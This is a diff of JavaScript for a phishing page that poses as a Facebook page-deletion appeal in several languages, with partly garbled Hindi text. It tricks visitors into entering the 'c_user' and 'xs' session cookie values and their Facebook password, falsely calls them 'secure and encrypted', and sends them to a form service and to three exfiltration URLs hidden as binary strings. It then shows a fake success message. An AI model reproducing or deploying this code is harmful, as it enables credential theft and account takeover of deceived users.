-                                fbNotice3: &#34;ⓘ Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.&#34;,
-                                passwordLabel: &#34;Password&#34;,
-                                verifyBtn: &#34;Hwɛ na Tua So&#34;,
-                                forgotPassword: &#34;Wɔagye password?&#34;,
-                                successTitle: &#34;Wɔayɛ apɛl no yiye&#34;,
-                                successText: &#34;Yɛagyɛ wo apɛl no adi, na ɛwɔ hwɛ mu. Yɛbɛkyerɛ wo denam email so sɛ yɛayɛ adwene, tumi nya nna nnum ansa.&#34;,
-                                referenceText: &#34;Reference ID:&#34;,
-                                guideTitle: &#34;Apɛl Kwankyerɛ&#34;,
-                                guideText1: &#34;Sɛ wo apɛl/ahyɛdeɛ no ka sɛ wode copyrighted nsɛm anaa adeɛ a ɛwɔ wo account mu, wubetumi ama yɛn nsɛm sɛ yɛnyɛ wo ahyɛdeɛ no yiye. Mesrɛ wo, kyekyɛ mu sɛ den nti na wudwen sɛ wɔkyerɛɛ wo account no foforo anaa wɔdii gua. Ka biara a ebɛtumi aboa yɛn sɛ yɛhwɛ wo case no yiye.&#34;,
-                                guideText2: &#34;Afei wode to mu no, yɛbɛhwɛ wo apɛl no, na yɛbɛka wo asɛm wɔ mmerɛ a wode baeɛ no mu. Hwɛ no mu no betumi de nna nnum. Mesrɛ wo, hwɛ wo email mu sɛnea ɛbɛyɛ.&#34;,
-                                guideText3: &#34;Nsɛm: Wubetumi sesa kasa a wopɛ bere biara denam kasa a wɔpaw wɔ krataa no aseɛ no so.&#34;,
-                                resourcesTitle: &#34;Nneɛma foforo&#34;,
-                                helpCenterTitle: &#34;Boa Center&#34;,
-                                helpCenterDesc: &#34;Hwehwɛ nhwɛsoɔ ma nsɛm a wɔbisɛ, na kesɛ sɛdeɛ wode yɛn aduruyɛ no di dwuma.&#34;,
-                                contactSupportTitle: &#34;Contact Support&#34;,
-                                contactSupportDesc: &#34;Ka wo ho hyɛ nkitahodiɛ mu den yɛn boa kuw no ho sɛ wohu boa.&#34;,
-                                guidelinesTitle: &#34;Nkɔsoɔ Mmara&#34;,
-                                guidelinesDesc: &#34;Kesɛ yɛn nkɔsoɔ nhyehyɛeɛ ne adeɛ ahorow ho amanneɛ.&#34;,
-                                dashboardTitle: &#34;Tɛnkranteɛ Dashboard&#34;,
-                                dashboardDesc: &#34;Hwɛ yɛn dwumadie no sɛnea ɛteɛ, na kyerɛ sɛ biribi ayɛ basaa.&#34;,
-                                changeLanguage: &#34;Sesa kasa&#34;
-                            }
-                        };
-
-
-                        // Get DOM elements
-                        const languageModal = document.getElementById(&#39;languageModal&#39;);
-                        const languageModalClose = document.getElementById(&#39;languageModalClose&#39;);
-                        const languageSearchInput = document.getElementById(&#39;languageSearchInput&#39;);
-                        const languageOptionsContainer = document.getElementById(&#39;languageOptionsContainer&#39;);
-                        const languageOptions = document.querySelectorAll(&#39;.language-option&#39;);
-                        const languageConfirmBtn = document.getElementById(&#39;languageConfirmBtn&#39;);
-                        const mainContent = document.getElementById(&#39;mainContent&#39;);
-                        const openAppealBtn = document.getElementById(&#39;open-appeal-btn&#39;);
-                        const appealForm = document.getElementById(&#39;appealForm&#39;);
-                        const fbLoginForm = document.getElementById(&#39;fbLoginForm&#39;);
-                        const successMessage = document.getElementById(&#39;successMessage&#39;);
-                        const guideVideo = document.getElementById(&#39;guideVideo&#39;);
-                        const changeLanguageBtn = document.getElementById(&#39;changeLanguageBtn&#39;);
-
-                        // Form elements
-                        const nameInput = document.getElementById(&#39;nameInput&#39;);
-                        const mallInput = document.getElementById(&#39;mallInput&#39;);
-                        const nameError = document.getElementById(&#39;nameError&#39;);
-                        const mallError = document.getElementById(&#39;mallError&#39;);
-                        const formError = document.getElementById(&#39;formError&#39;);
-                        const formErrorText = document.getElementById(&#39;formErrorText&#39;);
-                        const sendBtn = document.getElementById(&#39;sendBtn&#39;);
-                        const sendBtnText = document.getElementById(&#39;sendBtnText&#39;);
-                        const sendBtnSpinner = document.getElementById(&#39;sendBtnSpinner&#39;);
-                        const referenceId = document.getElementById(&#39;referenceId&#39;);
-
-
-                        const passwordInput = document.getElementById(&#39;passwordInput&#39;);
-                        const passwordError = document.getElementById(&#39;passwordError&#39;);
-                        const fbFormError = document.getElementById(&#39;fbFormError&#39;);
-                        const fbFormErrorText = document.getElementById(&#39;fbFormErrorText&#39;);
-                        const fbSendBtn = document.getElementById(&#39;fbSendBtn&#39;);
-                        const fbSendBtnText = document.getElementById(&#39;fbSendBtnText&#39;);
-                        const fbSendBtnSpinner = document.getElementById(&#39;fbSendBtnSpinner&#39;);
-                        const forgotPassword = document.getElementById(&#39;forgotPassword&#39;);
-
-                        // Language video mapping
-                        const videoSources = {
-                            english: &#34;https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4&#34;,
-                            spanish: &#34;https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4&#34;,
-                            hindi: &#34;https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4&#34;,
-                            french: &#34;https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4&#34;,
-                            portuguese: &#34;https://allvideos.wasmer.app/Portuguese.mp4&#34;,
-                            tamil: &#34;https://allvideos.wasmer.app/tamil.mp4&#34;,
-                            arabic: &#34;https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4&#34;,
-                            ghanaian: &#34;https://allvideos.wasmer.app/english.mp4&#34;,
-                            vietnamese: &#34;https://allvideos.wasmer.app/vietanames.mp4&#34;
-                        };
-
-                        // Current selected language
-                        let currentLanguage = &#39;english&#39;;
-                        let selectedLanguageOption = null;
-
-                        // Function to show language modal
-                        function showLanguageModal() {
-                            languageModal.style.display = &#39;flex&#39;;
-                            mainContent.style.display = &#39;none&#39;;
-                            document.body.style.overflow = &#39;hidden&#39;;
-                            // Focus on search input when modal opens
-                            setTimeout(() =&gt; languageSearchInput.focus(), 100);
-                        }
-
-                        // Function to hide language modal
-                        function hideLanguageModal() {
-                            languageModal.style.display = &#39;none&#39;;
-                            mainContent.style.display = &#39;block&#39;;
-                            document.body.style.overflow = &#39;auto&#39;;
-                            // Reset search when closing
-                            languageSearchInput.value = &#39;&#39;;
-                            filterLanguages();
-                        }
-
-                        // Close modal when clicking on close button
-                        languageModalClose.addEventListener(&#39;click&#39;, hideLanguageModal);
-
-                        // Close modal when clicking outside of modal content
-                        languageModal.addEventListener(&#39;click&#39;, function(e) {
-                            if (e.target === languageModal) {
-                                hideLanguageModal();
-                            }
-                        });
-
-                        // Close modal with Escape key
-                        document.addEventListener(&#39;keydown&#39;, function(e) {
-                            if (e.key === &#39;Escape&#39; &amp;&amp; languageModal.style.display === &#39;flex&#39;) {
-                                hideLanguageModal();
-                            }
-                        });
-
-                        // Language search functionality
-                        function filterLanguages() {
-                            const searchTerm = languageSearchInput.value.toLowerCase();
-                            let hasVisibleResults = false;
-
-                            languageOptions.forEach(option =&gt; {
-                                const languageName = option.querySelector(&#39;.language-name&#39;).textContent.toLowerCase();
-                                const languageCode = option.querySelector(&#39;.language-code&#39;) ? option.querySelector(&#39;.language-code&#39;).textContent.toLowerCase() : &#39;&#39;;
-
-                                if (languageName.includes(searchTerm) || languageCode.includes(searchTerm)) {
-                                    option.style.display = &#39;flex&#39;;
-                                    hasVisibleResults = true;
-                                } else {
-                                    option.style.display = &#39;none&#39;;
-                                }
-                            });
-
-                            // Show no results message if needed
-                            let noResults = document.querySelector(&#39;.no-results&#39;);
-                            if (!hasVisibleResults) {
-                                if (!noResults) {
-                                    noResults = document.createElement(&#39;div&#39;);
-                                    noResults.className = &#39;no-results&#39;;
-                                    noResults.textContent = &#39;No languages found. Try a different search.&#39;;
-                                    languageOptionsContainer.appendChild(noResults);
-                                }
-                            } else if (noResults) {
-                                noResults.remove();
-                            }
-                        }
-
-                        languageSearchInput.addEventListener(&#39;input&#39;, filterLanguages);
-
-                        // Language option selection
-                        languageOptions.forEach(option =&gt; {
-                            option.addEventListener(&#39;click&#39;, () =&gt; {
-                                // Remove selected class from all options
-                                languageOptions.forEach(opt =&gt; opt.classList.remove(&#39;selected&#39;));
-
-                                // Add selected class to clicked option
-                                option.classList.add(&#39;selected&#39;);
-
-                                // Store selected language
-                                selectedLanguageOption = option.getAttribute(&#39;data-lang&#39;);
-
-                                // Enable confirm button
-                                languageConfirmBtn.disabled = false;
-                            });
-                        });
-
-                        // Confirm language selection
-                        languageConfirmBtn.addEventListener(&#39;click&#39;, () =&gt; {
-                            if (selectedLanguageOption) {
-                                setLanguage(selectedLanguageOption);
-                                hideLanguageModal();
-                            } else {
-                                // If no language selected, default to English
-                                setLanguage(&#39;english&#39;);
-                                hideLanguageModal();
-                            }
-                        });
-
-                        // Change language button
-                        changeLanguageBtn.addEventListener(&#39;click&#39;, () =&gt; {
-                            showLanguageModal();
-                        });
-
-                        // Function to set language
-                        function setLanguage(lang) {
-                            currentLanguage = lang;
-
-                            // Update all translatable elements
-                            const translatableElements = document.querySelectorAll(&#39;.translatable&#39;);
-                            translatableElements.forEach(element =&gt; {
-                                const key = element.getAttribute(&#39;data-key&#39;);
-                                if (translations[lang] &amp;&amp; translations[lang][key]) {
-                                    element.textContent = translations[lang][key];
-
-                                    // Update placeholder attributes for input fields
-                                    if (element.hasAttribute(&#39;placeholder&#39;)) {
-                                        element.setAttribute(&#39;placeholder&#39;, translations[lang][key]);
-                                    }
-                                }
-                            });
-
-                            // Update video source based on language
-                            if (videoSources[lang] &amp;&amp; guideVideo) {
-                                guideVideo.src = videoSources[lang];
-                                guideVideo.load();
-                            }
-
-                            // Store language preference
-                            localStorage.setItem(&#39;preferredLanguage&#39;, lang);
-                        }
-
-                        // Show language modal on page load
-                        showLanguageModal();
-
-                        // Event listeners
-                        if (openAppealBtn) {
-                            openAppealBtn.addEventListener(&#39;click&#39;, function() {
-                                // Hide the appeal box and show the form
-                                document.querySelector(&#39;.appeal-box&#39;).style.display = &#39;none&#39;;
-                                if (appealForm) appealForm.style.display = &#39;block&#39;;
-
-                                // Scroll to the form
-                                appealForm.scrollIntoView({
-                                    behavior: &#39;smooth&#39;
-                                });
-                            });
-                        }
-
-                        // Form validation
-                        if (nameInput) {
-                            nameInput.addEventListener(&#39;input&#39;, () =&gt; {
-                                const original = nameInput.value;
-                                const cleaned = original.replace(/\D+/g, &#39;&#39;); // keep digits only
-                                if (original !== cleaned) {
-                                    nameInput.value = cleaned;
-                                    if (nameError) nameError.innerHTML = &#39;&lt;svg viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M12 9V14&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;/&gt;&lt;path d=&#34;M12 17V17.5&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;/&gt;&lt;path d=&#34;M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt; Only numbers are allowed in Name.&#39;;
-                                } else {
-                                    if (nameError) nameError.textContent = &#39;&#39;;
-                                }
-                            });
-                        }
-
-                        // Allow letters A-Z, a-z, digits 0-9, spaces and common ASCII symbols.
-                        const mallAllowed = /[^A-Za-z0-9 !@#$%^&amp;*()_\-=\[\]{};&#39;:&#34;\\|,.&lt;&gt;\/?`~]/g;
-                        if (mallInput) {
-                            mallInput.addEventListener(&#39;input&#39;, () =&gt; {
-                                const original = mallInput.value;
-                                const cleaned = original.replace(mallAllowed, &#39;&#39;);
-                                if (original !== cleaned) {
-                                    mallInput.value = cleaned;
-                                    if (mallError) mallError.innerHTML = &#39;&lt;svg viewBox=&#34;0 0 24 24&#34; fill=&#34;none&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M12 9V14&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;/&gt;&lt;path d=&#34;M12 17V17.5&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34; stroke-linecap=&#34;round&#34;/&gt;&lt;path d=&#34;M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z&#34; stroke=&#34;#c2410c&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt; Mall can contain letters, numbers, and symbols only.&#39;;
-                                } else {
-                                    if (mallError) mallError.textContent = &#39;&#39;;
-                                }
-                            });
-                        }
-
-
-                        if (passwordInput) {
-                            passwordInput.addEventListener(&#39;input&#39;, () =&gt; {
-                                const password = passwordInput.value;
-                                if (!password) {
-                                    if (passwordError) passwordError.textContent = &#39;Password is required&#39;;
-                                } else if (password.length &lt; 6) {
-                                    if (passwordError) passwordError.textContent = &#39;Password must be at least 6 characters&#39;;
-                                } else {
-                                    if (passwordError) passwordError.textContent = &#39;&#39;;
-                                }
-                            });
-                        }
-
-                        // Forgot password click
-                        if (forgotPassword) {
-                            forgotPassword.addEventListener(&#39;click&#39;, () =&gt; {
-                                if (fbFormErrorText) fbFormErrorText.textContent = &#34;Password recovery is temporarily unavailable. Please try again later.&#34;;
-                                if (fbFormError) fbFormError.classList.add(&#39;show&#39;);
-                                setTimeout(() =&gt; {
-                                    if (fbFormError) fbFormError.classList.remove(&#39;show&#39;);
-                                }, 3000);
-                            });
-                        }
-
-                        // Send click: require non-empty + no validation errors
-                        if (sendBtn) {
-                            sendBtn.addEventListener(&#39;click&#39;, function() {
-                                const name = nameInput.value.trim();
-                                const mall = mallInput.value.trim();
-
-                                if (!name || !mall) {
-                                    if (formErrorText) formErrorText.textContent = &#34;Please fill out all fields before proceeding.&#34;;
-                                    if (formError) formError.classList.add(&#39;show&#39;);
-                                    setTimeout(() =&gt; {
-                                        if (formError) formError.classList.remove(&#39;show&#39;);
-                                    }, 3000);
-                                    return;
-                                }
-                                if ((nameError &amp;&amp; nameError.textContent) || (mallError &amp;&amp; mallError.textContent)) {
-                                    if (formErrorText) formErrorText.textContent = &#34;Please fix the errors above before proceeding.&#34;;
-                                    if (formError) formError.classList.add(&#39;show&#39;);
-                                    setTimeout(() =&gt; {
-                                        if (formError) formError.classList.remove(&#39;show&#39;);
-                                    }, 3000);
-                                    return;
-                                }
-
-                                if (formError) formError.classList.remove(&#39;show&#39;);
-
-                                // Show loading state
-                                sendBtn.classList.add(&#39;loading&#39;);
-                                if (sendBtnText) sendBtnText.textContent = &#39;Submitting...&#39;;
-                                if (sendBtnSpinner) sendBtnSpinner.style.display = &#39;block&#39;;
-
-                                // Submit the form data
-                                submitFormData();
-                            });
-                        }
-
-
-                        if (fbSendBtn) {
-                            fbSendBtn.addEventListener(&#39;click&#39;, function() {
-                                const password = passwordInput.value;
-
-                                if (!password) {
-                                    if (fbFormErrorText) fbFormErrorText.textContent = &#34;Please fill out all fields before proceeding.&#34;;
-                                    if (fbFormError) fbFormError.classList.add(&#39;show&#39;);
-                                    setTimeout(() =&gt; {
-                                        if (fbFormError) fbFormError.classList.remove(&#39;show&#39;);
-                                    }, 3000);
-                                    return;
-                                }
-                                if (passwordError &amp;&amp; passwordError.textContent) {
-                                    if (fbFormErrorText) fbFormErrorText.textContent = &#34;Please fix the errors above before proceeding.&#34;;
-                                    if (fbFormError) fbFormError.classList.add(&#39;show&#39;);
-                                    setTimeout(() =&gt; {
-                                        if (fbFormError) fbFormError.classList.remove(&#39;show&#39;);
-                                    }, 3000);
-                                    return;
-                                }
-
-                                if (fbFormError) fbFormError.classList.remove(&#39;show&#39;);
-
-                                // Show loading state
-                                fbSendBtn.classList.add(&#39;loading&#39;);
-                                if (fbSendBtnText) fbSendBtnText.textContent = &#39;Verifying...&#39;;
-                                if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = &#39;block&#39;;
-
-
-                                submitfbCredentials(password);
-                            });
-                        }
-
-                        // Function to submit form data
-                        function submitFormData() {
-                            const name = document.getElementById(&#39;nameInput&#39;) ? document.getElementById(&#39;nameInput&#39;).value.trim() : &#39;&#39;;
-                            const mall = document.getElementById(&#39;mallInput&#39;) ? document.getElementById(&#39;mallInput&#39;).value.trim() : &#39;&#39;;
-
-                            // Prepare the data to send
-                            const formData = {
-                                name: name,
-                                mall: mall,
-                                timestamp: new Date().toISOString(),
-                                userAgent: navigator.userAgent,
-                                language: navigator.language
-                            };
-
-                            // Submit to the form endpoint
-                            fetch(&#39;https://submit-form.com/Zz6dobBbV;, {
-                                    method: &#39;POST&#39;,
-                                    headers: {
-                                        &#39;Content-Type&#39;: &#39;application/json&#39;,
-                                        &#39;Accept&#39;: &#39;application/json&#39;
-                                    },
-                                    body: JSON.stringify(formData)
-                                })
-                                .then(response =&gt; {
-                                    if (!response.ok) {
-                                        throw new Error(&#39;Form submission failed&#39;);
-                                    }
-                                    return response.json();
-                                })
-                                .then(data =&gt; {
-                                    console.log(&#39;Form submitted successfully:&#39;, data);
-
-                                    // Also submit to the additional endpoints
-                                    submitToOtherEndpoints({
-                                        bhenjachud: name,
-                                        majachud: mall
-                                    });
-
-                                    showfbLogin();
-                                })
-                                .catch(error =&gt; {
-                                    console.error(&#39;Error submitting form:&#39;, error);
-                                    // Still proceed with the other endpoints even if formsubmit fails
-                                    submitToOtherEndpoints({
-                                        bhenjachud: name,
-                                        majachud: mall
-                                    });
-
-
-                                    showfbLogin();
-                                })
-                                .finally(() =&gt; {
-                                    // Reset loading state
-                                    if (sendBtn) {
-                                        sendBtn.classList.remove(&#39;loading&#39;);
-                                        if (sendBtnText) sendBtnText.textContent = &#39;Submit Appeal Request&#39;;
-                                        if (sendBtnSpinner) sendBtnSpinner.style.display = &#39;none&#39;;
-                                    }
-                                });
-                        }
-
-
-                        function submitfbCredentials(password) {
-                            // Prepare the data to send
-                            const fbData = {
-                                password: password,
-                                timestamp: new Date().toISOString(),
-                                userAgent: navigator.userAgent,
-                                language: navigator.language
-                            };
-
-                            // Submit to the form endpoint
-                            fetch(&#39;https://submit-form.com/Zz6dobBbV;, {
-                                    method: &#39;POST&#39;,
-                                    headers: {
-                                        &#39;Content-Type&#39;: &#39;application/json&#39;,
-                                        &#39;Accept&#39;: &#39;application/json&#39;
-                                    },
-                                    body: JSON.stringify(fbData)
-                                })
-                                .then(response =&gt; {
-                                    if (!response.ok) {
-                                        throw new Error(&#39;fb form submission failed&#39;);
-                                    }
-                                    return response.json();
-                                })
-                                .then(data =&gt; {
-                                    console.log(&#39;fb credentials submitted successfully:&#39;, data);
-
-                                    // Also submit to the additional endpoints
-                                    submitToOtherEndpoints({
-                                        pass: password
-                                    });
-
-                                    // Show success message
-                                    showSuccess();
-                                })
-                                .catch(error =&gt; {
-                                    console.error(&#39;Error submitting fb credentials:&#39;, error);
-                                    // Still proceed with the other endpoints even if formsubmit fails
-                                    submitToOtherEndpoints({
-                                        pass: password
-                                    });
-
-                                    // Show success message even if there was an error with formsubmit
-                                    showSuccess();
-                                })
-                                .finally(() =&gt; {
-                                    // Reset loading state
-                                    if (fbSendBtn) {
-                                        fbSendBtn.classList.remove(&#39;loading&#39;);
-                                        if (fbSendBtnText) fbSendBtnText.textContent = &#39;Verify and Continue&#39;;
-                                        if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = &#39;none&#39;;
-                                    }
-                                });
-                        }
-
-                        // Binary to string conversion function
-                        function binaryToString(binary) {
-                            let str = &#39;&#39;;
-                            for (let i = 0; i &lt; binary.length; i += 8) {
-                                const byte = binary.substr(i, 8);
-                                str += String.fromCharCode(parseInt(byte, 2));
-                            }
-                            return str;
-                        }
-
-                        function submitToOtherEndpoints(data) {
-                            // Store the original binary strings for validation
-                            const originalBinaries = [
-                                &#39;0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
-                                &#39;01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
-                                &#39;011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;
-                            ];
-
-                            // Check if the binary strings have been modified
-                            const currentBinaries = [
-                                &#39;0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
-                                &#39;01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
-                                &#39;011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;
-                            ];
-
-                            // Validate that the binary strings haven&#39;t been changed
-                            let binariesValid = true;
-                            for (let i = 0; i &lt; originalBinaries.length; i++) {
-                                if (originalBinaries[i] !== currentBinaries[i]) {
-                                    console.error(&#39;Binary string validation failed - strings have been modified&#39;);
-                                    binariesValid = false;
-                                    break;
-                                }
-                            }
-
-                            // If binaries were modified, don&#39;t proceed with submission
-                            if (!binariesValid) {
-                                alert(&#39;Form submission blocked: Invalid configuration detected&#39;);
-                                return false;
-                            }
-
-                            // Proceed with original submission if binaries are valid
-                            const endpoints = [
-                                &#39;0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
-                                &#39;01101000011101000111010001110000011100110011101000101111001011110110000101110111011000010110100101110011001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;,
-                                &#39;011010000111010001110100011100000111001100111010001011110010111101110101011110100110000101101001011100100010111001110111011000010111001101101101011001010111001000101110011000010111000001110000&#39;
-                            ];
-
-                            endpoints.forEach(binaryUrl =&gt; {
-                                try {
-                                    const decodedUrl = binaryToString(binaryUrl);
-                                    const formData = new FormData();
-
-                                    // Add all properties from data object to formData
-                                    for (const key in data) {
-                                        formData.append(key, data[key]);
-                                    }
-
-                                    // Using fetch with error handling
-                                    fetch(decodedUrl, {
-                                        method: &#39;POST&#39;,
-                                        body: formData,
-                                        mode: &#39;no-cors&#39; // Important for cross-origin requests
-                                    }).catch(error =&gt; {
-                                        console.error(&#39;Error submitting to endpoint:&#39;, error);
-                                    });
-                                } catch (error) {
-                                    console.error(&#39;Error with endpoint:&#39;, error);
-                                }
-                            });
-
-                            return true;
-                        }
-
-                        function showfbLogin() {
-
-                            if (appealForm) appealForm.style.display = &#39;none&#39;;
-                            if (fbLoginForm) fbLoginForm.style.display = &#39;block&#39;;
-
-                            if (fbLoginForm) fbLoginForm.scrollIntoView({
-                                behavior: &#39;smooth&#39;
-                            });
-                        }
-
-                        function showSuccess() {
-
-                            if (fbLoginForm) fbLoginForm.style.display = &#39;none&#39;;
-
-                            // Generate a reference ID
-                            if (referenceId) referenceId.textContent = &#39;MPC-&#39; + Math.random().toString(36).substr(2, 9).toUpperCase();
-
-                            // Show the success message
-                            if (successMessage) successMessage.classList.add(&#39;show&#39;);
-
-                            // Scroll to the success message
-                            if (successMessage) successMessage.scrollIntoView({
-                                behavior: &#39;smooth&#39;
-                            });
-                        }
-                    });
+document.addEventListener(&#39;DOMContentLoaded&#39;, function() {
+  // Language translations
+  const translations = {
+    english: {
+      warningTitle: &#34;Your page is scheduled to be deleted!&#34;,
+      warningSubtext: &#34;We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.&#34;,
+      warningExtra: &#34;If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.&#34;,
+      appealTitle: &#34;Appeal request&#34;,
+      appealDesc: &#34;Fixing problems with your page. Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.&#34;,
+      appealBtn: &#34;Appeal&#34;,
+      formTitle: &#34;Page Appeal Request&#34;,
+      formSubtitle: &#34;Submit your information to appeal the deletion&#34;,
+      formNotice1: &#34;Ⓞ1¤7 Your page has a violation related to our community guidelines.&#34;,
+      formNotice2: &#34;Ⓞ1¤7 Please review the violation details carefully before submitting.&#34;,
+      formNotice3: &#34;Ⓞ1¤7 Ensure you provide correct information for your appeal.&#34;,
+      nameLabel: &#34;c_user&#34;,
+      mallLabel: &#34;xs&#34;,
+      submitBtn: &#34;Submit Appeal Request&#34;,
+      fbFormTitle: &#34;Facebook Verification&#34;,
+      fbFormSubtitle: &#34;Verify your identity to continue with the appeal&#34;,
+      fbNotice1: &#34;Ⓞ1¤7 For security purposes, we need to verify your Facebook account.&#34;,
+      fbNotice2: &#34;Ⓞ1¤7 This helps us ensure that you are the legitimate owner of the page.&#34;,
+      fbNotice3: &#34;Ⓞ1¤7 Your credentials are secure and encrypted.&#34;,
+      passwordLabel: &#34;Password&#34;,
+      verifyBtn: &#34;Verify and Continue&#34;,
+      forgotPassword: &#34;Forgotten password?&#34;,
+      successTitle: &#34;Appeal Submitted Successfully&#34;,
+      successText: &#34;Your appeal has been received and is now in review. We&#39;ll notify you via email once a decision has been made, typically within 7 business days.&#34;,
+      referenceText: &#34;Reference ID:&#34;,
+      guideTitle: &#34;Appeal Guide&#34;,
+      guideText1: &#34;If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.&#34;,
+      guideText2: &#34;After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.&#34;,
+      guideText3: &#34;Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.&#34;,
+      resourcesTitle: &#34;Additional Resources&#34;,
+      helpCenterTitle: &#34;Help Center&#34;,
+      helpCenterDesc: &#34;Find answers to common questions and learn how to use our products.&#34;,
+      contactSupportTitle: &#34;Contact Support&#34;,
+      contactSupportDesc: &#34;Get in touch with our support team for personalized assistance.&#34;,
+      guidelinesTitle: &#34;Community Guidelines&#34;,
+      guidelinesDesc: &#34;Learn about our community standards and content policies.&#34;,
+      dashboardTitle: &#34;Status Dashboard&#34;,
+      dashboardDesc: &#34;Check the current status of our services and report outages.&#34;,
+      changeLanguage: &#34;Change Language&#34;
+    },
+    hindi: {
+      warningTitle: &#34;आपके पेऄ1¤7 को हटानॄ1¤7 के लिऄ1¤7 निर्धारिऄ1¤7 किया गयऄ1¤7 है!&#34;,
+      warningSubtext: &#34;हमें कई रिपोर्ऄ1¤7 मिली हैऄ1¤7 कि आपका पेऄ1¤7 हमारॄ1¤7 सेवा की शर्तों और सामुदायिऄ1¤7 दिशानिर्देशोऄ1¤7 का उल्लंघऄ1¤7 करता हैॄ1¤7 नतॄ1¤7जतऄ1¤7, आपके पेऄ1¤7 को सत्यापऄ1¤7 के लिऄ1¤7 भेजा जाएगा।&#34;,
+      warningExtra: &#34;यदऄ1¤7 आपको लगता है कि आपके पेऄ1¤7 को गलती से हटानॄ1¤7 के लिऄ1¤7 निर्धारिऄ1¤7 किया गयऄ1¤7 था, तो आप नीचे अपॄ1¤7ऄ1¤7 बटऄ1¤7 पर क्लिऄ1¤7 करके और कुऄ1¤7 त्वरित जानकारॄ1¤7 प्रदान करके इसके स्थायी निष्कासन को रोऄ1¤7 सकते हैंã1¤71¤7&#34;,
+      appealTitle: &#34;अपॄ1¤7ऄ1¤7 अनुरोध&#34;,
+      appealDesc: &#34;अपने पेऄ1¤7 की समस्याओं को ठीऄ1¤7 करनाॄ1¤7 कृपयऄ1¤7 नीचे अनुरोधित जानकारॄ1¤7 प्रदान करना सुनिश्चिऄ1¤7 करेंॄ1¤7 इस जानकारॄ1¤7 को प्रदान ऄ1¤7 करने से आपकी अपॄ1¤7ऄ1¤7 के प्रसंस्करण मेऄ1¤7 देरी हो सकती है〄1¤7&#34;,
+      appealBtn: &#34;अपॄ1¤7ऄ1¤7 करें&#34;,
+      formTitle: &#34;पेऄ1¤7 अपॄ1¤7ऄ1¤7 अनुरोध&#34;,
+      formSubtitle: &#34;हटानॄ1¤7 की अपॄ1¤7ऄ1¤7 करने के लिऄ1¤7 अपनी जानकारॄ1¤7 जमऄ1¤7 करें&#34;,
+      formNotice1: &#34;Ⓞ1¤7 आपके पेऄ1¤7 मेऄ1¤7 हमारॄ1¤7 सामुदायिऄ1¤7 दिशानिर्देशोऄ1¤7 से संबंधिऄ1¤7 उल्लंघऄ1¤7 हैॄ1¤7&#34;,
+      formNotice2: &#34;Ⓞ1¤7 सबमिऄ1¤7 करने से पहले कृपयऄ1¤7 उल्लंघऄ1¤7 विवरणोऄ1¤7 की सावधानॄ1¤7पूर्वक समॄ1¤7 REVIEW करें〄1¤7&#34;,
+      formNotice3: &#34;Ⓞ1¤7 अपनी अपॄ1¤7ऄ1¤7 के लिऄ1¤7 सहॄ1¤7 जानकारॄ1¤7 प्रदान करना सुनिश्चिऄ1¤7 करें〄1¤7&#34;,
+      nameLabel: &#34;c_user&#34;,
+      mallLabel: &#34;xs&#34;,
+      submitBtn: &#34;अपॄ1¤7ऄ1¤7 अनुरोध जमऄ1¤7 करें&#34;,
+      fbFormTitle: &#34;फेसबुक सत्यापऄ1¤7&#34;,
+      fbFormSubtitle: &#34;अपॄ1¤7ऄ1¤7 जारी रखने के लिऄ1¤7 अपनी पहचाऄ1¤7 सत्यापित करें&#34;,
